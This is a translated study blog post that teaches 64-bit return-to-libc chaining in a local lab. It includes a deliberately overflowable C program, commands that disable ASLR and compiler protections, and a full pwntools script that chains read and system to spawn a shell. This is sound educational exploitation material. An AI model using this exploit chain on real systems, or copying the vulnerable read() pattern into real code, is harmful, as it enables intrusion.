---
title: "[PWNABLE] RTL_Chaining"
description: "※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections. ※ RTL_Chaining is an attack technique that applies the RTL method to form a chain and execute it. Although it may not be clear yet what it means to \"form a chain,\" it will be used very importantly in ROP, which will be discussed next, so please try to understand it and move on."
date: "2023-11-08"
translation_key: "tistory-98a777c41cfe"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-RTLChaining"
private: false
---

**※ If you find any incorrect parts, please let me know. I will check and make the necessary corrections.**※

RTL_Chaining is an attack technique that applies the RTL technique to form a chain and execute it.

At this point, you might not fully understand what it means to "form a chain," but

since it will be very important in the upcoming ROP section, it is essential to understand it before moving on.

As discussed in RTL, gadgets are needed.

Since we will be conducting the practice in a 64-bit environment,

we need to consider the six registers (rdi, rsi, rdx, rcx, r8, r9) used in the System V calling convention.

First, since this technique does not bypass ASLR, I will disable this protection mechanism.

```
sudo sysctl -w kernel.randomize_va_space=0
```

![](/assets/images/tistory/tistory-98a777c41cfe/001.png)

The example code is as follows.

```
#include <stdio.h>

void provide_gadget() {
    __asm__ ("pop %r9");
    __asm__ ("pop %r8");
    __asm__ ("pop %rcx");
    __asm__ ("pop %rdx");
    __asm__ ("pop %rsi");
    __asm__ ("pop %rdi");
    __asm__ ("ret");
    __asm__ ("pop %rax");
    __asm__ ("ret");
    __asm__ ("pop %rbx");
    __asm__ ("ret");
    __asm__ ("mov %rbx, (%rax)");
    __asm__ ("ret");
    __asm__ ("mov %rax, (%rbx)");
    __asm__ ("ret");
}

int main(void)
{
    char buf[256];
    read(0,buf,512);
    printf("%s",buf);
}
```

This is a code structure you might have seen before.

Now, you can see that there is a buffer overflow vulnerability.

Looking at the example above, since the system function does not exist, it might be unclear how to execute a shell.

```
gcc -no-pie -mpreferred-stack-boundary=4 -fno-stack-protector -fno-pie -o ex ex.c
```

I have disabled the protection mechanisms and compiled the code.

![](/assets/images/tistory/tistory-98a777c41cfe/002.png)

As expected, the symbols for the system and execve functions are not loaded.

![](/assets/images/tistory/tistory-98a777c41cfe/003.png)

What if this binary file is executed?

![](/assets/images/tistory/tistory-98a777c41cfe/004.png)

When the library file is loaded, it gains addresses for these functions.

We need to exploit this point to carry out the attack.

Can we assume that these addresses are immutable?

The answer is obviously yes, because ASLR is disabled, so they are immutable.

If ASLR is enabled, meaning the addresses are variable, then we need to perform a ROP attack.

![](/assets/images/tistory/tistory-98a777c41cfe/005.png)

This is the process of checking memory values using vmmap.

You can see that the address of libc_base is 0x00007ffff7d7f000.

![](/assets/images/tistory/tistory-98a777c41cfe/006.png)

Now, calculating the difference between the system address and this value gives us 0x50d70.

Now, I will check this in the referenced library file.

![](/assets/images/tistory/tistory-98a777c41cfe/007.png)

Since the libc file is libc.so.6, we just need to check the absolute path /lib/x86_64-linux-gnu/libc.so.6.

![](/assets/images/tistory/tistory-98a777c41cfe/008.png)

We can see that the offset of system is the same as the value obtained from the binary file we compiled.

That is, each function can read information when the library file is referenced.

* * *

Now, I will proceed with the attack practice.

Since PIE is also disabled, we can easily obtain the plt and got addresses of the functions.

There are various attack methods, but to better understand the bss segment,

I will use the read function to input "/bin/sh".

Here, the addresses we need to obtain are as follows:

1. Obtain the addresses of read and system functions - function execution

2. Obtain the gadgets for pppr and pr - chain construction

3. Obtain the address of the bss segment - "/bin/sh" string

First, let me explain the scenario:

1. Use the read function to input '/bin/sh\x00' into the bss segment.

2. Use the pop rdi; ret; gadget to execute the system function.

Since there are only two steps, it is very simple.

First, checking the buffer size, we can see it is 0x100.

![](/assets/images/tistory/tistory-98a777c41cfe/009.png)

Now, I will gather the necessary materials.

Obtaining the address of the read function - plt

![](/assets/images/tistory/tistory-98a777c41cfe/010.png)

Obtaining gadgets - rdi, rsi gadgets

![](/assets/images/tistory/tistory-98a777c41cfe/011.png)

Finding the bss address

![](/assets/images/tistory/tistory-98a777c41cfe/012.png)

Finding the system address

![](/assets/images/tistory/tistory-98a777c41cfe/013.png)

Summarizing the obtained values, we have the following:

p_rdi = 0x0000000000401165

p_rdi_rsi_rdx = 0x0000000000401163

read@plt = 0x0000000000401060

system@add = 0x7ffff7dcfd70

bss = 0000000000404038

Now, I will create the payload.

```
from pwn import*

p = process('./ex')

p_rdi = 0x0000000000401165
p_rdi_rsi_rdx = 0x0000000000401163
read_plt = 0x0000000000401060
system_add = 0x7ffff7dcfd70
bss = 0x0000000404038

payload = b'A'*0x100
payload += b'B'*0x8
```

So far, this is the same as previous attack techniques.

Now, I will construct the chain, which consists of chains to execute the read and system functions.

Looking at the read function first, it requires three arguments.

Therefore, it needs the gadgets for the three registers rdi, rsi, and rdx.

For the system function, since it only needs one argument, we can use the rdi gadget.

The code we will implement is as follows.

```
read(0,bss,8);
system(bss);
```

Incidentally, we have obtained gadgets that can modify all of rdi, rsi, and rdx from the gadgets.

Now, we can construct the chain.

p_rdi_rsi_rdx

0

bss

8

read@plt

This form is the first chain.

Then, the second chain.

p_rdi

bss

system@add

Once we have constructed all the chains, I will complete the payload.

```
from pwn import*

p = process('./ex')

p_rdi = 0x0000000000401165
p_rdi_rsi_rdx = 0x0000000000401163
read_plt = 0x0000000000401060
system_add = 0x7ffff7dcfd70
bss = 0x0000000404038

payload = b'A'*0x100
payload += b'B'*0x8

#Chain1 - input /bin/sha
payload += p64(p_rdi_rsi_rdx)
payload += p64(0x8)
payload += p64(bss)
payload += p64(0x0)
payload += p64(read_plt)

#Chain2 - get shell
payload += p64(p_rdi)
payload += p64(bss)
payload += p64(system_add)

p.send(payload)

p.send(b'/bin/sh\x00')

p.interactive()
```

When executed, it will successfully obtain a shell.

![](/assets/images/tistory/tistory-98a777c41cfe/014.png)